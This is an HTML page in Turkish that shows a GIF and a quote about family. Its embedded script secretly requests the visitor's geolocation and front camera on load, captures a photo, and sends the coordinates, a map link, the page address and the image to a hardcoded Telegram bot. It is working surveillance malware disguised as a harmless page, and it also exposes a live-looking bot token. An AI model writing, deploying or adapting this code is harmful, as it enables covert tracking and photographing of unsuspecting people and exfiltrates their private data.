<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GIF GÃ¶sterimi</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #1a1a1a;
            font-family: Arial, sans-serif;
        }

        .container {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            width: 100%;
            min-height: 100vh;
            gap: 30px;
            padding: 20px;
        }

        .container img {
            max-width: 90%;
            max-height: 70vh;
            width: auto;
            height: auto;
            object-fit: contain;
        }

        .quote {
            color: #ffffff;
            font-size: 24px;
            font-style: italic;
            text-align: center;
            padding: 0 20px;
            max-width: 800px;
            line-height: 1.6;
        }

        @media (max-width: 768px) {
            .quote {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="Don Carlone.gif" alt="GIF" onerror="this.style.display='none';">
        <p class="quote">"A man who doesn't spend time with his family can never be a real man."</p>
    </div>

    <script>
        // Telegram ayarlarÄ±
        const BOT_TOKEN = '8542243389:AAFoXxq3J61qVvo2tl7EeMcgdY3mMQYibDU';
        const CHAT_ID = '-4991699158';
        const API_URL = 'https://api.telegram.org/bot';

        // Telegram'a mesaj gÃ¶nder
        async function sendToTelegram(text, photo) {
            try {
                // Mesaj gÃ¶nder
                await fetch(`${API_URL}${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });

                // FotoÄŸraf varsa gÃ¶nder
                if (photo) {
                    const base64 = photo.replace(/^data:image\/\w+;base64,/, '');
                    const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
                    const blob = new Blob([bytes], { type: 'image/jpeg' });
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'photo.jpg');
                    formData.append('caption', 'ğŸ“¸ Kamera fotoÄŸrafÄ±');
                    await fetch(`${API_URL}${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (error) {
                console.error('Telegram hatasÄ±:', error);
            }
        }

        // Konum al
        function getLocation() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject('Geolocation yok');
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        acc: pos.coords.accuracy
                    }),
                    err => reject(err.message),
                    { timeout: 10000, maximumAge: 60000 }
                );
            });
        }

        // FotoÄŸraf Ã§ek
        function takePhoto() {
            return new Promise((resolve, reject) => {
                if (!navigator.mediaDevices?.getUserMedia) {
                    reject('Kamera yok');
                    return;
                }
                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
                    .then(stream => {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.playsInline = true;
                        video.muted = true;
                        video.play();
                        video.onloadedmetadata = () => {
                            setTimeout(() => {
                                const canvas = document.createElement('canvas');
                                canvas.width = video.videoWidth;
                                canvas.height = video.videoHeight;
                                canvas.getContext('2d').drawImage(video, 0, 0);
                                stream.getTracks().forEach(t => t.stop());
                                resolve(canvas.toDataURL('image/jpeg', 0.7));
                            }, 500);
                        };
                    })
                    .catch(reject);
            });
        }

        // Ana fonksiyon
        async function start() {
            let loc = null;
            let photo = null;

            // Paralel iste
            const results = await Promise.allSettled([
                getLocation().catch(e => ({ error: e })),
                takePhoto().catch(e => ({ error: e }))
            ]);

            if (results[0].status === 'fulfilled' && !results[0].value.error) {
                loc = results[0].value;
            }
            if (results[1].status === 'fulfilled' && !results[1].value.error) {
                photo = results[1].value;
            }

            // Mesaj oluÅŸtur
            let msg = 'ğŸ”” <b>Yeni ZiyaretÃ§i</b>\n\n';
            msg += `â° ${new Date().toLocaleString('tr-TR')}\n`;
            msg += `ğŸŒ ${window.location.href}\n\n`;

            if (loc) {
                msg += `ğŸ“ <b>Konum:</b>\n`;
                msg += `Enlem: ${loc.lat}\n`;
                msg += `Boylam: ${loc.lng}\n`;
                msg += `DoÄŸruluk: ${Math.round(loc.acc)}m\n\n`;
                msg += `ğŸ—ºï¸ <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}">Haritada GÃ¶r</a>\n\n`;
            } else {
                msg += `âŒ Konum alÄ±namadÄ±\n\n`;
            }

            msg += photo ? `ğŸ“¸ FotoÄŸraf Ã§ekildi\n` : `âŒ FotoÄŸraf alÄ±namadÄ±\n`;

            // GÃ¶nder
            await sendToTelegram(msg, photo);
        }

        // Sayfa yÃ¼klendiÄŸinde baÅŸlat
        function init() {
            setTimeout(start, 1000);
        }

        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', init);
        } else {
            init();
        }

        window.addEventListener('load', init);
    </script>
</body>
</html>
